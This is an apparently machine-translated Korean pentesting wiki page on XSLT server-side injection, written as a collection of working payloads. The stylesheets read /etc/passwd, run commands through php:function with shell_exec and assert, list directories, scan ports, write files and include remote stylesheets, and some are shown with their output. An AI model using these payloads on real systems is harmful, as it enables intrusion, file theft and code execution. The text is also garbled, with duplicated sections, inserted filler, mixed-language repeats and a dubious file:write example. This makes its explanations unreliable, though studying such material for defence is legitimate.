# XSLT 서버 측 인젝션 (Extensible Stylesheet Language Transformations)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>

## 기본 정보

XSLT는 XML 문서를 다른 형식으로 변환하는 데 사용되는 기술입니다. 버전 1, 2, 3으로 나뉘어지며, 가장 일반적으로 사용되는 것은 버전 1입니다. 변환 프로세스는 서버 또는 브라우저 내에서 실행될 수 있습니다.

가장 자주 사용되는 프레임워크는 다음과 같습니다:

- Gnome의 **Libxslt**,
- Apache의 **Xalan**,
- Saxonica의 **Saxon**.

XSLT와 관련된 취약점을 악용하기 위해서는 서버 측에 xsl 태그가 저장되어 있고 해당 내용에 액세스해야 합니다. 이러한 취약점에 대한 예시는 다음 소스에서 문서화되어 있습니다: [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/).

## 예제 - 튜토리얼
```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```
{% code title="xml.xml" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
<cd>
<title>CD Title</title>
<artist>The artist</artist>
<company>Da Company</company>
<price>10000</price>
<year>1760</year>
</cd>
</catalog>
```
{% code title="xsl.xsl" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td><xsl:value-of select="catalog/cd/title"/></td>
<td><xsl:value-of select="catalog/cd/artist"/></td>
</tr>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

실행하기:
```xml
saxonb-xslt -xsl:xsl.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td>CD Title</td>
<td>The artist</td>
</tr>
</table>
</body>
</html>
```
### 지문

{% code title="detection.xsl" %}
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

그리고 실행하세요.
```xml
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
### 로컬 파일 읽기

{% code title="read.xsl" %}
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}
```xml
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```
### SSRF

SSRF (Server-Side Request Forgery)는 웹 애플리케이션에서 발생하는 취약점 중 하나입니다. 이 취약점은 악의적인 사용자가 서버 내부 리소스에 대한 요청을 위조하거나 조작할 수 있는 기능을 이용하는 것을 의미합니다.

SSRF는 주로 웹 애플리케이션에서 외부 리소스에 대한 요청을 처리하기 위해 사용되는 기능을 악용합니다. 예를 들어, 웹 애플리케이션이 이미지 리소스를 가져오기 위해 URL을 사용하는 경우, 악의적인 사용자는 임의의 URL을 제공하여 서버 내부 리소스에 대한 요청을 위조할 수 있습니다.

SSRF 공격은 다양한 형태로 이루어질 수 있습니다. 예를 들어, 악의적인 사용자는 내부 네트워크에 접근하거나 인증된 사용자의 데이터에 접근하기 위해 서버 내부의 다른 서비스에 대한 요청을 위조할 수 있습니다.

SSRF 공격을 방지하기 위해서는 다음과 같은 조치를 취할 수 있습니다:

- 입력 유효성 검사: 사용자로부터 받은 입력을 신뢰할 수 있는지 확인하기 위해 입력 유효성 검사를 수행해야 합니다.
- 화이트리스트 필터링: 허용되지 않은 도메인이나 IP 주소를 거부하기 위해 화이트리스트 필터링을 구현해야 합니다.
- 로컬 리소스 제한: 서버 내부 리소스에 대한 요청을 허용하지 않도록 로컬 리소스 제한을 설정해야 합니다.

SSRF 공격은 웹 애플리케이션의 보안에 중대한 위협을 가지고 있으므로, 개발자와 보안 전문가는 이러한 공격을 이해하고 방지하기 위한 조치를 적용해야 합니다.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
### 버전

사용된 XSLT 버전에 따라 더 많거나 더 적은 기능이 있을 수 있습니다:

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## 지문

이를 업로드하고 정보를 얻으세요
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
## SSRF

SSRF (Server-Side Request Forgery)는 웹 애플리케이션에서 발생하는 취약점 중 하나입니다. 이 취약점은 악의적인 사용자가 서버 내부 리소스에 대한 요청을 위조하거나 조작할 수 있는 기능을 이용하는 것을 의미합니다.

SSRF는 주로 웹 애플리케이션에서 외부 리소스에 대한 요청을 처리하기 위해 사용되는 기능을 악용합니다. 예를 들어, 웹 애플리케이션이 이미지 리소스를 가져오기 위해 URL을 사용하는 경우, 악의적인 사용자는 임의의 URL을 제공하여 서버 내부 리소스에 대한 요청을 위조할 수 있습니다.

SSRF 공격은 다양한 형태로 이루어질 수 있습니다. 예를 들어, 악의적인 사용자는 내부 네트워크에 접근하거나 인증된 사용자의 데이터에 접근하기 위해 서버 내부의 다른 서비스에 대한 요청을 위조할 수 있습니다.

SSRF 공격을 방지하기 위해서는 다음과 같은 조치를 취할 수 있습니다:

- 입력 유효성 검사: 사용자로부터 받은 입력을 신뢰할 수 있는지 확인하기 위해 입력 유효성 검사를 수행해야 합니다.
- 화이트리스트 필터링: 허용되지 않은 도메인이나 IP 주소를 필터링하여 외부 리소스에 대한 요청을 제한할 수 있습니다.
- 로컬 리소스 제한: 서버 내부 리소스에 대한 요청을 허용하는 경우, 최소한의 권한으로만 접근할 수 있도록 제한해야 합니다.

SSRF 공격은 웹 애플리케이션의 보안에 중대한 위협을 가질 수 있으므로, 개발자와 보안 전문가는 이러한 취약점을 인식하고 방어하기 위한 조치를 취해야 합니다.
```xml
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```
## 자바스크립트 삽입

Javascript injection is a technique used by attackers to inject malicious Javascript code into a vulnerable website. This can be done through various attack vectors, such as user input fields, URL parameters, or even HTTP headers.

자바스크립트 삽입은 공격자가 취약한 웹사이트에 악성 자바스크립트 코드를 삽입하는 기법입니다. 이는 사용자 입력 필드, URL 매개변수 또는 심지어 HTTP 헤더와 같은 다양한 공격 벡터를 통해 수행될 수 있습니다.

The injected Javascript code can be used to perform various malicious activities, such as stealing sensitive information, hijacking user sessions, or redirecting users to malicious websites. It can also be used to deface the website or perform other types of attacks.

삽입된 자바스크립트 코드는 민감한 정보를 도용하거나 사용자 세션을 탈취하거나 사용자를 악성 웹사이트로 리디렉션하는 등 다양한 악의적인 활동에 사용될 수 있습니다. 또한 웹사이트를 변조하거나 다른 유형의 공격을 수행하는 데에도 사용될 수 있습니다.

To prevent Javascript injection attacks, it is important to properly validate and sanitize user input, as well as implement security measures such as input validation, output encoding, and secure coding practices. Regular security audits and vulnerability assessments can also help identify and mitigate potential vulnerabilities.

자바스크립트 삽입 공격을 방지하기 위해서는 사용자 입력을 적절하게 유효성 검사하고 정제하는 것이 중요합니다. 또한 입력 유효성 검사, 출력 인코딩 및 안전한 코딩 관행과 같은 보안 조치를 구현하는 것이 필요합니다. 정기적인 보안 감사와 취약성 평가는 잠재적인 취약점을 식별하고 완화하는 데 도움이 될 수 있습니다.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```
## 디렉토리 목록 (PHP)

### **Opendir + readdir**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```
### **Assert (var\_dump + scandir + false)**

**Assert (var\_dump + scandir + false)**는 XSLT 서버 측 삽입 기술 중 하나입니다. 이 기술은 서버 측에서 XSLT 스타일시트를 실행하여 원격 파일 시스템의 내용을 탐색하는 데 사용됩니다.

이 기술은 다음과 같은 단계로 구성됩니다:

1. `var\_dump` 함수를 사용하여 현재 환경의 변수를 출력합니다.
2. `scandir` 함수를 사용하여 원격 파일 시스템의 디렉토리를 스캔합니다.
3. `false` 값을 반환하여 XSLT 스타일시트의 실행을 중지합니다.

이 기술은 서버 측에서 XSLT 스타일시트를 실행하는 환경에서만 작동합니다. 따라서 적절한 환경에서만 사용해야 합니다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
<br />
</body>
</html>
```
## 파일 읽기

### **내부 - PHP**
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', ‘utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
### **내부 - XXE**

XXE (Extensible Markup Language External Entity)는 XML 외부 엔티티를 사용하여 서버 측에서 코드를 실행할 수 있는 취약점입니다. 이 취약점은 XML 파싱 과정에서 발생하며, 공격자는 외부 엔티티를 통해 서버 파일 시스템에 액세스하거나 원격 코드 실행을 수행할 수 있습니다.

XXE 취약점을 악용하기 위해 공격자는 XML 입력에 외부 엔티티 선언을 삽입합니다. 이 엔티티는 파일 시스템에 액세스하거나 원격 서버에 요청을 보낼 수 있는 URL을 가리킬 수 있습니다. 서버는 XML을 파싱하는 동안 외부 엔티티를 로드하고 실행하므로, 공격자는 이를 통해 서버 측에서 코드를 실행할 수 있습니다.

XXE 취약점을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 입력 유효성 검사: XML 입력을 받을 때 외부 엔티티 선언을 필터링하거나 제거합니다.
- 안전한 XML 파서 사용: 안전한 XML 파서를 사용하여 외부 엔티티를 처리하고, 외부 엔티티를 비활성화하는 옵션을 설정합니다.
- 보안 설정 강화: 서버의 보안 설정을 강화하여 외부 엔티티를 처리하지 않도록 합니다.

XXE 취약점은 심각한 보안 위협이 될 수 있으므로, 개발자와 시스템 관리자는 이를 인식하고 적절한 대응 방안을 마련해야 합니다.
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```
### **HTTP를 통해**

HTTP를 통해 XSLT 서버 측 인젝션을 수행하는 방법은 다음과 같습니다:

1. 웹 애플리케이션에 대한 정보 수집: 웹 애플리케이션의 URL, 매개변수 및 요청 방식을 확인합니다.

2. XSLT 인젝션 취약점 확인: 웹 애플리케이션에서 XSLT 변환을 수행하는지 확인합니다. 이를 확인하기 위해 일반적으로 XML 파일을 요청하고 응답을 확인합니다.

3. XSLT 페이로드 작성: XSLT 페이로드를 작성하여 서버 측 코드를 실행하도록 설계합니다. 이를 위해 XSLT 템플릿을 사용하고, 서버 측 코드를 호출하는 함수를 포함시킬 수 있습니다.

4. XSLT 인젝션 실행: XSLT 페이로드를 웹 애플리케이션에 전송하여 인젝션을 실행합니다. 이를 위해 일반적으로 POST 요청을 사용하며, XSLT 페이로드를 요청 매개변수로 전달합니다.

5. 결과 확인: 서버의 응답을 확인하여 XSLT 인젝션의 성공 여부를 확인합니다. 이를 통해 서버 측 코드의 출력을 확인하거나, 기타 취약점을 찾을 수 있습니다.

XSLT 서버 측 인젝션은 웹 애플리케이션에서 XSLT 변환을 수행하는 경우에만 적용될 수 있습니다. 따라서 이 기술을 사용하기 전에 웹 애플리케이션의 구조와 동작 방식을 분석하는 것이 중요합니다.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```
### **내부 (PHP 함수)**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
<br />
</body>
</html>
```
### 포트 스캔

A port scan is a technique used to identify open ports on a target system. It involves sending network requests to different ports and analyzing the responses to determine which ports are open and potentially vulnerable to attack. Port scanning can be performed using various tools and techniques, such as TCP SYN scans, TCP connect scans, and UDP scans. By identifying open ports, an attacker can gain valuable information about the target system's services and potentially exploit any vulnerabilities associated with those services.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```
## 파일에 쓰기

### XSLT 2.0

XSLT 2.0은 파일에 쓰는 기능을 제공합니다. 이를 통해 서버 측에서 파일을 생성하고 내용을 쓸 수 있습니다. 이를 통해 서버 측 인젝션을 수행할 수 있습니다.

다음은 XSLT 2.0을 사용하여 파일에 쓰는 예시입니다.

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:file="http://example.com/file">

<xsl:template match="/">
  <xsl:variable name="content" select="'This is the content to write to the file'" />
  <xsl:variable name="filename" select="'/path/to/file.txt'" />
  
  <xsl:value-of select="file:write($filename, $content)" />
</xsl:template>

</xsl:stylesheet>
```

위의 예시에서는 `file:write` 함수를 사용하여 `$filename`에 지정된 경로의 파일에 `$content`를 씁니다. 이를 통해 서버 측에서 임의의 파일을 생성하고 내용을 쓸 수 있습니다.

XSLT 2.0은 파일에 쓰기 기능 외에도 다양한 기능을 제공합니다. 이를 통해 서버 측에서 다양한 작업을 수행할 수 있습니다.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```
### **Xalan-J 확장**

Xalan-J은 Apache Xalan 프로젝트의 일부로서, Java 언어로 작성된 XSLT 프로세서입니다. Xalan-J은 XSLT 스타일시트를 처리하고 XML 문서를 변환하는 데 사용됩니다. Xalan-J은 XSLT 1.0 및 XSLT 2.0을 지원하며, Xalan-J 확장을 사용하여 XSLT 프로세서에 추가 기능을 제공할 수 있습니다.

Xalan-J 확장은 Xalan-J 프로세서에 사용자 정의 함수와 변수를 추가하는 데 사용됩니다. 이를 통해 XSLT 스타일시트에서 사용자 정의 로직을 실행할 수 있습니다. Xalan-J 확장은 Java 클래스로 작성되며, Xalan-J 프로세서에서 로드되어 사용됩니다.

Xalan-J 확장을 사용하여 서버 측에서 XSLT 서식 문자열 삽입 (XSLT Server-Side Injection) 공격을 수행할 수 있습니다. 이 공격은 악의적인 XSLT 스타일시트를 사용하여 서버 측에서 임의의 코드를 실행하는 것을 목표로 합니다. 이를 통해 서버의 기밀 정보를 노출하거나 시스템에 대한 악용을 할 수 있습니다.

Xalan-J 확장을 사용한 XSLT 서버 측 삽입 공격은 취약한 XSLT 스타일시트를 통해 수행됩니다. 이를 방지하기 위해 적절한 입력 유효성 검사와 필터링을 수행해야 합니다. 또한, Xalan-J 확장을 사용하지 않거나, 신뢰할 수 있는 소스에서만 사용해야 합니다.
```xml
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```
다른 방법으로 PDF 파일에 파일을 작성하는 방법

## 외부 XSL 포함하기
```xml
<xsl:include href="http://extenal.web/external.xsl"/>
```

```xml
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```
## 코드 실행

### **php:function**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```
### **다른 언어**

**이 페이지에서는 다른 언어에서 RCE 예제를 찾을 수 있습니다:** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(C#, Java, PHP)**

## **클래스에서 PHP 정적 함수에 접근하기**

다음 함수는 클래스 XSL의 정적 메소드 `stringToUrl`을 호출할 것입니다:
```xml
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-àÔ|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```
(예시: [http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls](http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls)에서 가져온 예시)

## 추가적인 Payloads
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)을 확인하세요.
* [https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)을 확인하세요.

## **브루트포스 탐지 목록**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **참고 자료**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 **HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
